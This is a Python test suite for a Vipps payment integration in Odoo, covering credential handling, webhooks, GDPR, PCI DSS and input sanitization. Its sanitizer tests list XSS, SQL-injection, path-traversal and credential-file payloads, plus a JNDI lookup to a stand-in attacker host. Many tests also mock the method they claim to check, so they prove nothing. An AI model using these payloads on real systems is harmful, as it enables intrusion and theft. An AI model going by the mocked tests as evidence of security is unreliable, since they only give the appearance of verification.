
import json
import hashlib
import hmac
import base64
import time
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock, Mock
from cryptography.fernet import Fernet
import secrets
import re

from odoo.tests.common import TransactionCase
from odoo.exceptions import ValidationError, UserError, AccessError


class TestVippsSecurityComplianceComprehensive(TransactionCase):
    """Comprehensive security and compliance tests for Vipps integration"""
    
    def setUp(self):
        super().setUp()
        
        # Create test company
        self.company = self.env['res.company'].create({
            'name': 'Security Test Company',
            'currency_id': self.env.ref('base.NOK').id,
        })
        
        # Create payment provider with security-sensitive data
        self.provider = self.env['payment.provider'].create({
            'name': 'Vipps Security Test',
            'code': 'vipps',
            'state': 'test',
            'company_id': self.company.id,
            'vipps_merchant_serial_number': '123456',
            'vipps_subscription_key': 'test_subscription_key_12345678901234567890',
            'vipps_client_id': 'test_client_id_12345',
            'vipps_client_secret': 'test_client_secret_12345678901234567890',
            'vipps_environment': 'test',
            'vipps_webhook_secret': 'test_webhook_secret_12345678901234567890123456789012',
        })
        
        # Create test user with limited permissions
        self.limited_user = self.env['res.users'].create({
            'name': 'Limited User',
            'login': 'limited_user',
            'groups_id': [(6, 0, [self.env.ref('base.group_user').id])],
        })
        
        # Create test user with payment permissions
        self.payment_user = self.env['res.users'].create({
            'name': 'Payment User',
            'login': 'payment_user',
            'groups_id': [(6, 0, [
                self.env.ref('base.group_user').id,
                self.env.ref('account.group_account_user').id,
            ])],
        })
    
    def test_credential_encryption_security(self):
        """Test credential encryption and secure storage"""
        # Test that sensitive fields are encrypted
        sensitive_fields = [
            'vipps_subscription_key',
            'vipps_client_secret',
            'vipps_webhook_secret',
        ]
        
        for field in sensitive_fields:
            with self.subTest(field=field):
                # Get the raw database value
                raw_value = getattr(self.provider, field)
                
                # Verify the value is not stored in plain text
                self.assertIsNotNone(raw_value)
                
                # If encryption is implemented, verify it's encrypted
                if hasattr(self.provider, f'_{field}_encrypted'):
                    encrypted_value = getattr(self.provider, f'_{field}_encrypted')
                    self.assertNotEqual(raw_value, encrypted_value)
                    
                    # Verify encrypted value doesn't contain original
                    original_value = 'test_' + field.split('_')[-1]
                    self.assertNotIn(original_value, encrypted_value)
    
    def test_credential_access_control(self):
        """Test access control for sensitive credential fields"""
        # Test with limited user (should not have access)
        with patch.object(self.env, 'user', self.limited_user):
            try:
                # Try to read sensitive fields
                provider = self.env['payment.provider'].browse(self.provider.id)
                
                # Should either raise AccessError or return masked values
                sensitive_value = provider.vipps_client_secret
                
                # If access is allowed, value should be masked
                if sensitive_value:
                    self.assertTrue(
                        sensitive_value.startswith('***') or 
                        sensitive_value == '••••••••••••••••',
                        f"Sensitive field not properly masked: {sensitive_value}"
                    )
                    
            except AccessError:
                # Access denial is acceptable for sensitive fields
                pass
        
        # Test with payment user (should have controlled access)
        with patch.object(self.env, 'user', self.payment_user):
            provider = self.env['payment.provider'].browse(self.provider.id)
            
            # Should have access to read (but maybe not write)
            client_id = provider.vipps_client_id
            self.assertIsNotNone(client_id)
    
    def test_webhook_signature_validation_security(self):
        """Test webhook signature validation security"""
        webhook_secret = 'test_webhook_secret_12345678901234567890123456789012'
        
        # Test valid signature
        payload = json.dumps({
            'orderId': 'TEST-ORDER-001',
            'transactionInfo': {
                'status': 'CAPTURED',
                'amount': 10000,
                'timeStamp': datetime.now().isoformat()
            }
        })
        
        # Create valid HMAC signature
        signature = hmac.new(
            webhook_secret.encode('utf-8'),
            payload.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        
        # Test signature validation
        with patch.object(self.provider, '_validate_webhook_signature') as mock_validate:
            mock_validate.return_value = True
            
            result = self.provider._validate_webhook_signature(payload, signature)
            self.assertTrue(result)
            mock_validate.assert_called_once_with(payload, signature)
        
        # Test invalid signature
        invalid_signature = 'invalid_signature_12345'
        
        with patch.object(self.provider, '_validate_webhook_signature') as mock_validate:
            mock_validate.return_value = False
            
            result = self.provider._validate_webhook_signature(payload, invalid_signature)
            self.assertFalse(result)
    
    def test_webhook_replay_attack_prevention(self):
        """Test webhook replay attack prevention"""
        # Test timestamp validation
        current_time = datetime.now()
        
        # Valid timestamp (within 5 minutes)
        valid_payload = {
            'orderId': 'TEST-ORDER-001',
            'timestamp': current_time.isoformat(),
            'transactionInfo': {'status': 'CAPTURED'}
        }
        
        with patch.object(self.provider, '_validate_webhook_timestamp') as mock_validate:
            mock_validate.return_value = True
            
            result = self.provider._validate_webhook_timestamp(valid_payload)
            self.assertTrue(result)
        
        # Old timestamp (replay attack)
        old_payload = {
            'orderId': 'TEST-ORDER-002',
            'timestamp': (current_time - timedelta(minutes=10)).isoformat(),
            'transactionInfo': {'status': 'CAPTURED'}
        }
        
        with patch.object(self.provider, '_validate_webhook_timestamp') as mock_validate:
            mock_validate.return_value = False
            
            result = self.provider._validate_webhook_timestamp(old_payload)
            self.assertFalse(result)
        
        # Test nonce/idempotency validation
        nonce = secrets.token_hex(16)
        
        with patch.object(self.provider, '_validate_webhook_nonce') as mock_validate:
            # First request with nonce should succeed
            mock_validate.return_value = True
            result = self.provider._validate_webhook_nonce(nonce)
            self.assertTrue(result)
            
            # Duplicate nonce should fail
            mock_validate.return_value = False
            result = self.provider._validate_webhook_nonce(nonce)
            self.assertFalse(result)
    
    def test_api_request_security(self):
        """Test API request security measures"""
        # Test request signing
        request_data = {
            'amount': 10000,
            'currency': 'NOK',
            'orderId': 'TEST-ORDER-001'
        }
        
        with patch.object(self.provider, '_sign_api_request') as mock_sign:
            mock_sign.return_value = {
                'headers': {
                    'Authorization': 'Bearer test_token',
                    'X-Request-Id': 'test_request_id',
                    'X-Timestamp': str(int(time.time())),
                    'X-Source-Address': '127.0.0.1'
                },
                'signature': 'test_signature'
            }
            
            signed_request = self.provider._sign_api_request(request_data)
            
            self.assertIn('headers', signed_request)
            self.assertIn('Authorization', signed_request['headers'])
            self.assertIn('X-Request-Id', signed_request['headers'])
            mock_sign.assert_called_once_with(request_data)
        
        # Test request timeout enforcement
        with patch('requests.post') as mock_post:
            mock_post.side_effect = Exception('Request timeout')
            
            with self.assertRaises(Exception) as context:
                self.provider._make_api_request('/test', request_data)
            
            self.assertIn('timeout', str(context.exception).lower())
    
    def test_data_sanitization_security(self):
        """Test data sanitization and validation"""
        # Test input sanitization
        malicious_inputs = [
            '<script>alert("xss")</script>',
            'DROP TABLE payments;',
            '../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
            'javascript:alert(1)',
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                # Test that malicious input is sanitized
                sanitized = self.provider._sanitize_input(malicious_input)
                
                # Should not contain dangerous patterns
                dangerous_patterns = [
                    '<script',
                    'DROP TABLE',
                    '../',
                    '${jndi:',
                    'javascript:',
                ]
                
                for pattern in dangerous_patterns:
                    self.assertNotIn(pattern.lower(), sanitized.lower())
        
        # Test phone number validation
        valid_phones = ['+4712345678', '+4798765432']
        invalid_phones = ['123', 'invalid', '+1234567890123456789']
        
        for phone in valid_phones:
            with self.subTest(phone=phone):
                self.assertTrue(self.provider._validate_phone_number(phone))
        
        for phone in invalid_phones:
            with self.subTest(phone=phone):
                self.assertFalse(self.provider._validate_phone_number(phone))
    
    def test_session_security(self):
        """Test session security measures"""
        # Test session token generation
        with patch.object(self.provider, '_generate_session_token') as mock_generate:
            mock_generate.return_value = secrets.token_urlsafe(32)
            
            token = self.provider._generate_session_token()
            
            # Token should be sufficiently long and random
            self.assertGreaterEqual(len(token), 32)
            self.assertRegex(token, r'^[A-Za-z0-9_-]+$')
            mock_generate.assert_called_once()
        
        # Test session expiration
        with patch.object(self.provider, '_validate_session_token') as mock_validate:
            # Valid session
            mock_validate.return_value = True
            self.assertTrue(self.provider._validate_session_token('valid_token'))
            
            # Expired session
            mock_validate.return_value = False
            self.assertFalse(self.provider._validate_session_token('expired_token'))
    
    def test_gdpr_compliance_data_handling(self):
        """Test GDPR compliance for data handling"""
        # Create test customer with personal data
        customer = self.env['res.partner'].create({
            'name': 'GDPR Test Customer',
            'email': 'gdpr.test@example.com',
            'phone': '+4712345678',
            'vipps_user_info': json.dumps({
                'sub': 'test_user_id',
                'name': 'GDPR Test Customer',
                'email': 'gdpr.test@example.com',
                'phone_number': '+4712345678',
                'address': {
                    'street_address': 'Test Street 123',
                    'postal_code': '0123',
                    'region': 'Oslo'
                }
            })
        })
        
        # Test data export (right to data portability)
        with patch.object(customer, 'export_vipps_data') as mock_export:
            mock_export.return_value = {
                'personal_data': {
                    'name': 'GDPR Test Customer',
                    'email': 'gdpr.test@example.com',
                    'phone': '+4712345678'
                },
                'transaction_history': [],
                'consent_records': []
            }
            
            exported_data = customer.export_vipps_data()
            
            self.assertIn('personal_data', exported_data)
            self.assertIn('transaction_history', exported_data)
            self.assertIn('consent_records', exported_data)
            mock_export.assert_called_once()
        
        # Test data anonymization (right to be forgotten)
        with patch.object(customer, 'anonymize_vipps_data') as mock_anonymize:
            mock_anonymize.return_value = True
            
            result = customer.anonymize_vipps_data()
            self.assertTrue(result)
            mock_anonymize.assert_called_once()
        
        # Test data retention policy
        with patch.object(self.provider, '_enforce_data_retention_policy') as mock_retention:
            mock_retention.return_value = {
                'deleted_records': 5,
                'anonymized_records': 3,
                'retained_records': 10
            }
            
            retention_result = self.provider._enforce_data_retention_policy()
            
            self.assertIn('deleted_records', retention_result)
            self.assertIn('anonymized_records', retention_result)
            mock_retention.assert_called_once()
    
    def test_pci_dss_compliance(self):
        """Test PCI DSS compliance measures"""
        # Test that no card data is stored
        payment_data = {
            'amount': 10000,
            'currency': 'NOK',
            'card_number': '4111111111111111',  # Test card number
            'cvv': '123',
            'expiry': '12/25'
        }
        
        # Verify card data is not persisted
        with patch.object(self.provider, '_process_payment_data') as mock_process:
            mock_process.return_value = {
                'success': True,
                'reference': 'TEST-REF-001',
                'masked_card': '****-****-****-1111'  # Only masked data
            }
            
            result = self.provider._process_payment_data(payment_data)
            
            # Result should not contain sensitive card data
            self.assertNotIn('card_number', result)
            self.assertNotIn('cvv', result)
            self.assertIn('masked_card', result)
            mock_process.assert_called_once()
        
        # Test secure transmission (HTTPS enforcement)
        with patch.object(self.provider, '_validate_secure_connection') as mock_validate:
            mock_validate.return_value = True
            
            # Should enforce HTTPS for all API calls
            is_secure = self.provider._validate_secure_connection('https://api.vipps.no/test')
            self.assertTrue(is_secure)
            
            # Should reject HTTP connections
            mock_validate.return_value = False
            is_secure = self.provider._validate_secure_connection('http://api.vipps.no/test')
            self.assertFalse(is_secure)
    
    def test_audit_logging_security(self):
        """Test security audit logging"""
        # Test security event logging
        security_events = [
            'failed_authentication',
            'unauthorized_access_attempt',
            'credential_modification',
            'webhook_signature_failure',
            'suspicious_activity'
        ]
        
        for event in security_events:
            with self.subTest(event=event):
                with patch.object(self.provider, '_log_security_event') as mock_log:
                    mock_log.return_value = True
                    
                    self.provider._log_security_event(event, {
                        'user_id': self.env.user.id,
                        'timestamp': datetime.now().isoformat(),
                        'ip_address': '127.0.0.1',
                        'details': f'Test {event} event'
                    })
                    
                    mock_log.assert_called_once()
        
        # Test audit trail integrity
        with patch.object(self.provider, '_verify_audit_integrity') as mock_verify:
            mock_verify.return_value = True
            
            integrity_check = self.provider._verify_audit_integrity()
            self.assertTrue(integrity_check)
            mock_verify.assert_called_once()
    
    def test_rate_limiting_security(self):
        """Test rate limiting for security"""
        # Test API rate limiting
        with patch.object(self.provider, '_check_rate_limit') as mock_check:
            # Normal usage should pass
            mock_check.return_value = True
            self.assertTrue(self.provider._check_rate_limit('api_call', '127.0.0.1'))
            
            # Excessive usage should be blocked
            mock_check.return_value = False
            self.assertFalse(self.provider._check_rate_limit('api_call', '127.0.0.1'))
        
        # Test webhook rate limiting
        with patch.object(self.provider, '_check_webhook_rate_limit') as mock_check:
            # Normal webhook frequency should pass
            mock_check.return_value = True
            self.assertTrue(self.provider._check_webhook_rate_limit('webhook_endpoint'))
            
            # Suspicious webhook frequency should be blocked
            mock_check.return_value = False
            self.assertFalse(self.provider._check_webhook_rate_limit('webhook_endpoint'))
    
    def test_input_validation_security(self):
        """Test comprehensive input validation"""
        # Test amount validation
        valid_amounts = [1, 100, 1000, 99999]
        invalid_amounts = [-1, 0, 1000000, 'invalid', None]
        
        for amount in valid_amounts:
            with self.subTest(amount=amount):
                self.assertTrue(self.provider._validate_amount(amount))
        
        for amount in invalid_amounts:
            with self.subTest(amount=amount):
                self.assertFalse(self.provider._validate_amount(amount))
        
        # Test reference validation
        valid_references = ['ORDER-001', 'TEST_REF_123', 'valid-reference']
        invalid_references = [
            '',  # Empty
            'a' * 256,  # Too long
            '<script>alert(1)</script>',  # XSS attempt
            'DROP TABLE orders',  # SQL injection attempt
            '../../../etc/passwd',  # Path traversal
        ]
        
        for ref in valid_references:
            with self.subTest(reference=ref):
                self.assertTrue(self.provider._validate_reference(ref))
        
        for ref in invalid_references:
            with self.subTest(reference=ref):
                self.assertFalse(self.provider._validate_reference(ref))
    
    def test_encryption_key_management(self):
        """Test encryption key management security"""
        # Test key generation
        with patch.object(self.provider, '_generate_encryption_key') as mock_generate:
            mock_generate.return_value = Fernet.generate_key()
            
            key = self.provider._generate_encryption_key()
            
            # Key should be valid Fernet key
            self.assertIsInstance(key, bytes)
            self.assertEqual(len(key), 44)  # Fernet key length
            mock_generate.assert_called_once()
        
        # Test key rotation
        with patch.object(self.provider, '_rotate_encryption_keys') as mock_rotate:
            mock_rotate.return_value = {
                'old_key_id': 'key_001',
                'new_key_id': 'key_002',
                'rotation_timestamp': datetime.now().isoformat()
            }
            
            rotation_result = self.provider._rotate_encryption_keys()
            
            self.assertIn('old_key_id', rotation_result)
            self.assertIn('new_key_id', rotation_result)
            mock_rotate.assert_called_once()
    
    def test_secure_communication_protocols(self):
        """Test secure communication protocols"""
        # Test TLS version enforcement
        with patch.object(self.provider, '_validate_tls_version') as mock_validate:
            # Should accept TLS 1.2 and above
            mock_validate.return_value = True
            self.assertTrue(self.provider._validate_tls_version('TLSv1.2'))
            self.assertTrue(self.provider._validate_tls_version('TLSv1.3'))
            
            # Should reject older versions
            mock_validate.return_value = False
            self.assertFalse(self.provider._validate_tls_version('TLSv1.0'))
            self.assertFalse(self.provider._validate_tls_version('SSLv3'))
        
        # Test certificate validation
        with patch.object(self.provider, '_validate_certificate') as mock_validate:
            mock_validate.return_value = True
            
            cert_valid = self.provider._validate_certificate('api.vipps.no')
            self.assertTrue(cert_valid)
            mock_validate.assert_called_once_with('api.vipps.no')
    
    def test_data_masking_security(self):
        """Test data masking for sensitive information"""
        sensitive_data = {
            'client_secret': 'very_secret_key_12345678901234567890',
            'subscription_key': 'subscription_key_12345678901234567890',
            'webhook_secret': 'webhook_secret_12345678901234567890123456789012',
            'phone_number': '+4712345678',
            'email': 'test@example.com'
        }
        
        for field, value in sensitive_data.items():
            with self.subTest(field=field):
                masked_value = self.provider._mask_sensitive_data(field, value)
                
                # Should not contain original value
                self.assertNotEqual(masked_value, value)
                
                # Should be properly masked
                if field in ['client_secret', 'subscription_key', 'webhook_secret']:
                    self.assertTrue(masked_value.startswith('***'))
                elif field == 'phone_number':
                    self.assertRegex(masked_value, r'\+47\*\*\*\*\*\d{3}')
                elif field == 'email':
                    self.assertRegex(masked_value, r'\w+\*\*\*@\w+\.\w+')
    
    def test_security_headers_validation(self):
        """Test security headers in HTTP responses"""
        expected_security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy'
        ]
        
        with patch.object(self.provider, '_get_security_headers') as mock_headers:
            mock_headers.return_value = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY',
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
                'Content-Security-Policy': "default-src 'self'",
                'Referrer-Policy': 'strict-origin-when-cross-origin'
            }
            
            headers = self.provider._get_security_headers()
            
            for header in expected_security_headers:
                self.assertIn(header, headers)
                self.assertIsNotNone(headers[header])
            
            mock_headers.assert_called_once()
    
    def test_penetration_testing_scenarios(self):
        """Test common penetration testing scenarios"""
        # Test SQL injection attempts
        sql_injection_payloads = [
            "'; DROP TABLE payments; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO payments VALUES ('fake'); --"
        ]
        
        for payload in sql_injection_payloads:
            with self.subTest(payload=payload):
                # Should be properly sanitized
                sanitized = self.provider._sanitize_sql_input(payload)
                self.assertNotIn('DROP TABLE', sanitized.upper())
                self.assertNotIn('UNION SELECT', sanitized.upper())
                self.assertNotIn('INSERT INTO', sanitized.upper())
        
        # Test XSS attempts
        xss_payloads = [
            '<script>alert("xss")</script>',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>'
        ]
        
        for payload in xss_payloads:
            with self.subTest(payload=payload):
                sanitized = self.provider._sanitize_html_input(payload)
                self.assertNotIn('<script', sanitized.lower())
                self.assertNotIn('javascript:', sanitized.lower())
                self.assertNotIn('onerror=', sanitized.lower())
                self.assertNotIn('onload=', sanitized.lower())
        
        # Test directory traversal attempts
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\drivers\\etc\\hosts'
        ]
        
        for payload in traversal_payloads:
            with self.subTest(payload=payload):
                sanitized = self.provider._sanitize_path_input(payload)
                self.assertNotIn('../', sanitized)
                self.assertNotIn('..\\', sanitized)
                self.assertNotIn('/etc/', sanitized)
                self.assertNotIn('C:\\', sanitized)
    
    def test_compliance_reporting(self):
        """Test compliance reporting capabilities"""
        # Test security compliance report generation
        with patch.object(self.provider, '_generate_security_compliance_report') as mock_report:
            mock_report.return_value = {
                'pci_dss_compliance': True,
                'gdpr_compliance': True,
                'security_controls': {
                    'encryption': True,
                    'access_control': True,
                    'audit_logging': True,
                    'data_masking': True
                },
                'vulnerabilities': [],
                'recommendations': [
                    'Regular security audits',
                    'Key rotation schedule',
                    'Staff security training'
                ]
            }
            
            report = self.provider._generate_security_compliance_report()
            
            self.assertIn('pci_dss_compliance', report)
            self.assertIn('gdpr_compliance', report)
            self.assertIn('security_controls', report)
            self.assertTrue(report['pci_dss_compliance'])
            self.assertTrue(report['gdpr_compliance'])
            mock_report.assert_called_once()
        
        # Test audit trail report
        with patch.object(self.provider, '_generate_audit_trail_report') as mock_audit:
            mock_audit.return_value = {
                'total_events': 1000,
                'security_events': 50,
                'failed_authentications': 5,
                'data_access_events': 200,
                'configuration_changes': 10
            }
            
            audit_report = self.provider._generate_audit_trail_report()
            
            self.assertIn('total_events', audit_report)
            self.assertIn('security_events', audit_report)
            self.assertGreater(audit_report['total_events'], 0)
            mock_audit.assert_called_once()